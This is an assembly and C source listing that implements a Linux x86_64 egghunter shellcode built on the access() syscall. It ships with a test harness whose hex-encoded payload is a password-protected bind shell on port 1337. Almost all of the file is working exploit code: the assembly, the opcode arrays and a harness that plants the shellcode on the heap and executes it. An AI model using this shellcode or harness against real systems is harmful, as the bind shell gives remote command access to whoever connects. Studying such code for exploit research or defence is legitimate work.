; Author Doreth.Z10
;
; Linux x86_64 Egghunter using sys_access()
; Shellcode size 49 bytes
;

global _start

section .text

_start:

    xor rsi, rsi        ; Some prep junk.
    push rsi
    pop rdx
    push 8
    pop rbx

go_end_of_page:
    or dx, 0xfff        ; We align with a page size of 0x1000

next_byte:

    inc rdx             ; next byte offset
    push 21
    pop rax             ; We load access() in RAX
    push rdx
    pop rdi
    add rdi, rbx        ; We need to be sure our 8 byte egg check does not span across 2 pages
    syscall             ; syscall to access()

    cmp al, 0xf2        ; Checks for EFAULT.  EFAULT indicates bad page access.

    jz go_end_of_page   ; if EFAULT, try next page

    ; --
    ; Put your won egg here !

    mov eax, 0xBEBDBEBD ; Egg contruction so we dont catch ourself !
    not eax             ; Important, EGG must contain NOP like instruction bytecode.

    ; --
    mov rdi, rdx
    scasd
    jnz next_byte       ; if egg does not match, try next byte
    cmp eax, [rdi]
    jnz next_byte       ; if egg does not match, try next byte

    jmp rdi             ; Good, found egg. Jump !
                        ; Important, EGG must contain NOP like instruction bytecode.



;
; Egghunter demonstration
;
; bindshell is pushed in the heap using a malloc() call and pre-pended with the egg. Then egghunter is fired.
;
; Depending on size of the malloc() call, binshell can be anywhere in the address space.
; For a big malloc() size like 1 000 000 bytes, it will be placed far in the address space.
; A malloc(1000000) was tested on a Unbuntu system with Inter Core i7 and it took over 9 hrs for the egghunter
; to find the egg.
;
; Enjoy.



#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char egg[] =
"YOUR EGG HERE 4 bytes";

// In this example we use a password protected binshell on port 1337: pAzzW0rd
unsigned char bindshell[] =
"\xeb\x09\x48\x31\xff\x48\xf7\xe7\x57\x5e\xc3\x55\x48\x89\xe5\xe8\xee\xff\xff\xff\x04\x29\x40\x80\xc7\x02\xff\xc6\x0f\x05\x50\xe8\xde\xff\xff\xff\x04\x31\x48\x8b\x3c\x24\x56\x81\xc6\x03\x01\x05\x39\x66\x81\xee\x01\x01\x56\x48\x89\xe6\x80\xc2\x10\x0f\x05\xe8\xbe\xff\xff\xff\x04\x32\x48\x8b\x7d\xf8\x0f\x05\xe8\xb1\xff\xff\xff\x04\x2b\x48\x8b\x7d\xf8\x48\x89\xe6\x80\xc2\x18\x52\x48\x89\xe2\x0f\x05\x49\x89\xc0\xe8\x97\xff\xff\xff\x4c\x89\xc7\x40\x80\xec\x18\x48\x89\xe6\x80\xc2\x18\x0f\x05\x48\xb8\x70\x41\x7a\x7a\x57\x30\x72\x64\x48\x89\xe7\x48\xaf\x75\x42\x48\x31\xc0\x4c\x89\xc7\x48\x31\xf6\x40\x80\xc6\x02\x04\x21\x0f\x05\x48\x31\xc0\x04\x21\x48\xff\xce\x75\xf4\x0f\x05\xe8\x55\xff\xff\xff\x50\x04\x3b\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x41\x50\x48\x89\xe7\x52\x48\x89\xe2\x57\x48\x89\xe6\x48\x89\xec\x5d\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05";

unsigned char egghunter[] =
"\x48\x31\xf6\x56\x5a\x6a\x08\x5b\x66\x81\xca\xff\x0f\x48\xff\xc2\x6a\x15\x58\x52\x5f\x48\x01\xdf\x0f\x05\x3c\xf2\x74\xea\xb8\xbd\xbe\xbd\xbe\xf7\xd0\x48\x89\xd7\xaf\x75\xe2\x3b\x07\x75\xde\xff\xe7";



main()
{

    char *heap = (char*)malloc(1000000);
    memset(heap, '\0', 512);
    strncpy(heap, egg, 4);
    strncpy(heap+4, egg, 4);
    strncpy(heap+8, bindshell, 212);

    printf("Egghunter Length: %d\n", strlen(egghunter));
    printf("Shellcode Length: %d\n", strlen(bindshell));
        int (*ret)() = (int(*)())egghunter;
        ret();
    return 0;
}